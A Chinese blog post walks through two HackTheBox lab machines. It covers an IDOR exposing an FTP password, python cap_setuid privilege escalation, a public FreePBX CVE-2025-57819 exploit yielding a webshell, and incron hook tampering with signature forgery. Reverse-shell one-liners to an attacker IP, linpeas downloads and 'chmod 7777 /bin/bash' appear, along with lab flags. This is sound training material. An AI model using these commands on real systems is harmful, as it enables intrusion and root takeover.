---
title: HackTheBox记录01
published: 2026-06-18T18:00:00
description: hackthebox靶场记录
tags:
  - HackTheBox
category: 网络安全
draft: false
---

# 靶场通关记录

# 靶场：Cap(Linux)

## Task 1

How many TCP ports are open?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.5.250
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-18 06:54 -0400
Nmap scan report for 10.129.5.250
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

answer：3

## Task 2

After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

访问页面之后，是一个网络抓包分析系统，在导航栏找到Security Snapshot (5 Second PCAP + Analysis)，点进去就会发现url是这样的：`http://10.129.5.250/data/1`

answer：data

## Task 3

Are you able to get to other users' scans?

修改url中的`id`部分

answer：yes

## Task 4/5

What is the ID of the PCAP file that contains sensative data?

Which application layer protocol in the pcap file can the sensetive data be found in?

使用burp，在上一步骤手工测试了1-3是存在的，但是实际上使用burp爆破发现还有个0

sniper attack->给url中的id加变量符->payload type选numbers->从0开始

`data/0`和其他的数据包长度不同，于是修改url，将该抓包文件进行下载，使用wireshark分析，发现FTP协议存在账户密码泄露

`36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan`

`40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!`

Task 4 answer：0

Task 5 answer：FTP

## Task 6

We've managed to collect nathan's FTP password. On what other service does this password work?

这下就可以尝试一下ssh登录

```
──(kali㉿kali)-[~/Desktop]
└─$ ssh nathan@10.129.5.250
The authenticity of host '10.129.5.250 (10.129.5.250)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.5.250' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.5.250's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

```

成功登录，发现当前目录下就是user的flag

```
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt 
f3e11475bd7f5f631ab75ec33b38f431

```

answer：SSH

## Task 8

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

那么接下来就需要提权root，拿到最后的flag了，需要借助到工具linPEAS

### **linPEAS**

**介绍**：

**用于在 Linux/Unix/MacOS 主机上搜索提升权限的可能路径**

LinPEAS 使用颜色来指示每个部分的起始位置。但**它也使用颜色来识别潜在的配置错误**。

1. **红色/黄色**用于识别导致 PE 的配置（99% 确定）
2. 红色用于识别可能导致权限提升的可疑配置
3. 绿色用于表示已知良好的配置（根据名称而非内容判断！）
4. 蓝色用于：无 shell 的用户和已挂载的**设备**
5. 浅**青色**用于：使用 shell 的用户
6. 浅**洋红色**用于：当前用户名

其他还有参数介绍，详细可以看：[github.com/peass-ng/PEASS-ng/tree/master/linPEAS](linPEAS)

依旧攻击机启动一个web服务，使用目标机来下载linpeas，之后赋予权限并启动

对攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.5.250 - - [18/Jun/2026 07:30:35] "GET /linpeas.sh HTTP/1.1" 200 -

```

对目标机的操作：

```
nathan@cap:~$ wget http://10.10.16.230/linpeas.sh
--2026-06-18 11:30:35--  http://10.10.16.230/linpeas.sh
Connecting to 10.10.16.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[====================================>]   1.01M   971KB/s    in 1.1s    

2026-06-18 11:30:36 (971 KB/s) - ‘linpeas.sh’ saved [1063041/1063041]

nathan@cap:~$ ls
linpeas.sh  user.txt
nathan@cap:~$ chmod +x linpeas.sh
nathan@cap:~$ ./linpeas.sh

```

扫描发现有一处标红部分，一般颜色比较突出的就是可利用部分

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

可以发现python3.8有特殊权限利用这个提权，可以设置uid为0（root的uid通常为0），然后去执行bash

```
nathan@cap:~$ python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@cap:~# ls
linpeas.sh  snap  user.txt
root@cap:~# cat /root/root.txt 
640bbd78aa4c1f8e97c799598d3f3205

```

Task 8 answer：/usr/bin/python3.8

Nathan answer：f3e11475bd7f5f631ab75ec33b38f431

Root answer：640bbd78aa4c1f8e97c799598d3f3205

# 靶场：Connected

没有问题，只有两个flag

扫描端口发现

```
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
// ssl证书
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.58 seconds

```

域名为`connected.htb`，web服务apache+php7.4.16，ssl证书`pbxconnect`，说明这可能是pbx（电话交换机）系统

直接访问打不开，写入hosts文件

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.6.182 connected.htb" | sudo tee -a /etc/hosts 
10.129.6.182 connected.htb

```

这次打开后被重定向到了`http://connected.htb/admin/config.php`，站点标题为FreePbx，Google了以下发现存在过多个严重的远程代码执行（RCE）漏洞，下载一个官方poc：`https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819`

```
python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb

```

拿到webshell

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
 
```

不能目录遍历，先测试一下webshell能不能用，如果可以，能不能反弹shell给攻击机

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=whoami"
asterisk

```

这里发现是可以的，尝试反弹（无效操作）

```     
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.230%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27"
curl: (3) bad range specification in URL position 299:
https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.230%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27

```

curl 报错是因为 URL 中的特殊字符（方括号 `[]`）没有被正确编码，生成base64编码的脚本，最后发现行不通（无效操作）

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.230",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' | base64 -w0

```

webshell行不通，改为`使用bash反弹shell`进行尝试

```

┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k --get "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-mbt9h7565j.php" \
  --data-urlencode "cmd=bash -c 'exec bash -i >& /dev/tcp/10.10.16.230/4444 0>&1'"
  
```

成功拿到shell，也拿下了用户的flag

```
[asterisk@connected admin]$ cd /home    
cd /home
[asterisk@connected home]$ ls
ls
asterisk
[asterisk@connected home]$ cd asterisk
cd asterisk
[asterisk@connected asterisk]$ cat user.txt
cat user.txt
a5a948b611b9fe60702a57c6d423dc75

```

现在要做的就是提权了，启个服务，让目标机下载linpeas，加权限并执行

对攻击机的操作：

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.6.182 - - [19/Jun/2026 04:28:36] "GET /linpeas.sh HTTP/1.1" 200 -

```

对目标机的操作：

```
[asterisk@connected asterisk]$ wget http://10.10.16.230:80/linpeas.sh -O /tmp/linpeas.sh
<k]$ wget http://10.10.16.230:80/linpeas.sh -O /tmp/                       linpeas.sh
--2026-06-19 08:28:36--  http://10.10.16.230/linpeas.sh
Connecting to 10.10.16.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [application/x-sh]
Saving to: '/tmp/linpeas.sh'

[asterisk@connected tmp]$ chmod +x linpeas.sh                              
chmod +x linpeas.sh                                                                                            
[asterisk@connected tmp]$ ./linpeas.sh                                     
./linpeas.sh

```

**先做了解**：

**incron** 是**文件事件触发**的任务系统

**介绍**：

|                  部分                  |          含义           |
| :----------------------------------: | :-------------------: |
|     `/var/spool/asterisk/incron`     |        监控这个目录         |
| `IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE` |   当文件被修改、属性改变、写入关闭时   |
|    `/usr/bin/sysadmin_manager $#`    | 执行这个命令，`$#` 是触发事件的文件名 |

使用过滤，只显示`/etc`的结果，以下输出的信息发现有点可疑

这是一个 **incron** 任务，监控 `/var/spool/asterisk/sysadmin/intrusion_detection_stop` 文件，当文件被写入（`IN_CLOSE_WRITE`）时，以**root 权限**执行 `/etc/init.d/fail2ban stop`

```
[asterisk@connected html]$ grep -i "/etc" /tmp/linpeas_output.txt | head -100
grep -i "/etc" /tmp/linpeas_output.txt | head -100
_laurel     712  0.9  0.2  31552  9720 ?        S<   07:33   0:45      _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
chrony      755  0.0  0.0 117816  3276 ?        S    07:33   0:00 /usr/sbin/chronyd -f /etc/sangoma_chrony.conf
mongodb    1238  0.5  1.6 478864 64028 ?        Sl   07:33   0:27 /usr/bin/mongod --quiet -f /etc/mongod.conf run
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop

```

查看系统incron任务，发现关键的两个，**`$#` 是触发事件的文件名**，会被作为参数传给 `sysadmin_manager`

```
[asterisk@connected html]$ cat /etc/incron.d/*
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

// 关键就是最后这两个
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

```

由于 incron 监控 `/var/spool/asterisk/incron` 目录，当文件被修改时执行 `/usr/bin/sysadmin_manager $#`，我们可以利用 `$#` 参数执行命令，于是进行查看`/usr/bin/sysadmin_manager`文件类型，发现是一个PHP脚本，尝试写入反弹shell代码发现不能进行读写，遂放弃

```
// 代码内容（后期发现，只贴出关键部分）
if ($module == "SYSTEM") {
        $signame = $hookfile;
} else {
        $signame = "hooks/$hook";
        
// Warning: This explicitly breaks utf8. If you need unicode, base64 it.
if (preg_match('/[^\x20-\x7e]/', $params, $out)) {
        syslog(LOG_ERR, "Out of spec char in params $params, ".json_encode($out));
        exit;

// 反弹shell代码（没成功）
<?php system("bash -c 'exec bash -i >& /dev/tcp/10.10.16.230/4444 0>&1'"); ?>

```

**在进行后续内容时，先了解一下**：

**Hook = 一个脚本文件**（通常是 bash 或 PHP 脚本），**当某个事件发生时被自动执行**。

在这个目标机也就是靶机中，**incron 是触发机制**：`某个文件被修改 → incron 检测到 → 执行 /usr/bin/sysadmin_manager`，**sysadmin_manager 是调度器**：`收到 incron 的通知 → 解析参数 → 找到对应的 hook → 执行 hook`，**Hook 是实际执行任务的脚本**：`执行 hook → hook 里写的是具体命令（比如重启服务、修改配置、执行命令）`

---

对攻击机的操作：（无效操作）

```
nc -lvnp 4444

```

对目标机的操作：（无效操作）

```
echo '#!/bin/bash
bash -c "exec bash -i >& /dev/tcp/10.10.16.230/4444 0>&1"' > /var/www/html/admin/modules/sysadmin/hooks/reboot

cat /var/www/html/admin/modules/sysadmin/hooks/reboot

cd /var/spool/asterisk/incron
echo "test" > sysadmin_reboot

```

到这里依然是攻击机没有监听到连接，目标机触发incron没用

**现在的解决方案是：要利用 `incron` 创建SUID Shell，而非依赖反弹**

既然直接反弹可能受阻，我们可以换一个“本地提权”的思路：用 `incron` 去修改 `/bin/bash`，给它加上SUID权限，这样就可以在当前的 `asterisk` Shell里直接变成 root

**以下为发现代码内容后的修改步骤**

查找可修改的hook文件

```
[asterisk@connected incron]$ find /var/www/html/admin/modules/ -path "*/hooks/*" -type f

```

修改reboot hook为提权命令

```
[asterisk@connected incron]$ cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'
<$ cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'          
> #!/bin/bash
#!/bin/bash
> chmod 7777 /bin/bash
chmod 7777 /bin/bash
> EOF
EOF
You have new mail in /var/mail/asterisk

```

计算新hash，伪造签名

```
[asterisk@connected incron]$ NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/reboot | awk '{print $1}')
<r/www/html/admin/modules/sysadmin/hooks/reboot | awk '{print $1}')  

```

更新签名文件，把假的变成真的

```
[asterisk@connected incron]$ sed -i "s/hooks\/reboot = .*/hooks\/reboot = $NEW_HASH/" \
    /var/www/html/admin/modules/sysadmin/module.sig
```

触发执行

```
[asterisk@connected incron]$ touch sysadmin.reboot
touch sysadmin.reboot

```

检查结果

```
[asterisk@connected incron]$ ls -la /bin/bash
ls -la /bin/bash
-rwsrwsrwt. 1 root root 964536 Apr  1  2020 /bin/bash
You have new mail in /var/mail/asterisk

```

**提权**并拿到flag

```
/bin/bash -p
whoami
root

cat /root/root.txt
ff74454b79a21ed713c0f2f1277b8e8f
```

Asterisk answer：a5a948b611b9fe60702a57c6d423dc75

Root answer：ff74454b79a21ed713c0f2f1277b8e8f